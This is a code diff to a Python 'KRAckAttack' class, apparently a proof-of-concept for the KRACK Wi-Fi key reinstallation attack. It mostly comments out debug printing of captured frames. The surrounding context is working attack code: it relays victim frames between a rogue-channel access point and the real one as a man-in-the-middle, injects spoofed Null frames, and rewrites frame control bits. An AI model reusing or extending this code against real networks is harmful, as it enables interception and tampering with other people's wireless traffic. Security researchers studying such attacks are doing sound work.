@@ -656,11 +656,12 @@ class KRAckAttack():
 				if p.addr2 in self.clients: self.clients[p.addr2].assocreq = p
 			# client端自己傳送 deauthentication 或 disassociation 給原 AP
 			elif p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
-				# print_rx(INFO, "Real channel ", p)
 				if p.addr2 in self.clients: del self.clients[p.addr2]
+
 			# For all other frames, only display them if they come from the targeted client
-			elif self.clientmac is not None and self.clientmac == p.addr2:
-				print_rx(INFO, "Real channel ", p)
+			# elif self.clientmac is not None and self.clientmac == p.addr2:
+			# 	print_rx(INFO, "Real channel ", p)
+
 			# Prevent the AP from thinking clients that are connecting are sleeping, until attack completed or failed
 			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Attack_Started:
 				log(WARNING, "Injecting Null frame so AP thinks client %s is awake (attacking sleeping clients is not fully supported)" % p.addr2)
@@ -710,10 +711,6 @@ class KRAckAttack():
 				else:
 					self.sock_rogue.send(p)
 
-		# 3. Always display all frames sent by or to the targeted client
-		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
-			print_rx(INFO, "Real channel " + str(ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL))), p)
-
 	def handle_rx_roguechan(self):
 		p = self.sock_rogue.recv()
 		if p == None: return
@@ -723,9 +720,10 @@ class KRAckAttack():
 			# Track time of last beacon we received. Verify channel to assure it's not the real AP.
 			if p.haslayer(Dot11Beacon) and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.rogue_channel:
 				self.last_rogue_beacon = time.time()
+
 			# Display all frames sent to the targeted client
-			if self.clientmac is not None and p.addr1 == self.clientmac:
-				print_rx(INFO, "Rogue channel", p)
+			# if self.clientmac is not None and p.addr1 == self.clientmac:
+			# 	print_rx(INFO, "Rogue channel", p)
 
 		# 2. Handle frames sent TO the AP
 		elif p.addr1 == self.apmac:
@@ -743,9 +741,10 @@ class KRAckAttack():
 				client = self.clients[p.addr2]
 				will_forward = client.should_forward(p)
 				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
+
 			# Always display all frames sent by the targeted client
-			elif p.addr2 == self.clientmac:
-				print_rx(INFO, "Rogue channel", p)
+			# elif p.addr2 == self.clientmac:
+			# 	print_rx(INFO, "Rogue channel", p)
 
 			# If this now belongs to a client we want to track, process the packet further
 			if client is not None:
@@ -769,11 +768,6 @@ class KRAckAttack():
 						p.FCfield &= 0xFFEF
 
 					self.sock_real.send(p)
-
-
-		# 3. Always display all frames sent by or to the targeted client
-		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
-			print_rx(INFO, "Rogue channel", p)
 
 	def handle_hostapd_out(self):
 		# hostapd always prints lines so this should not block
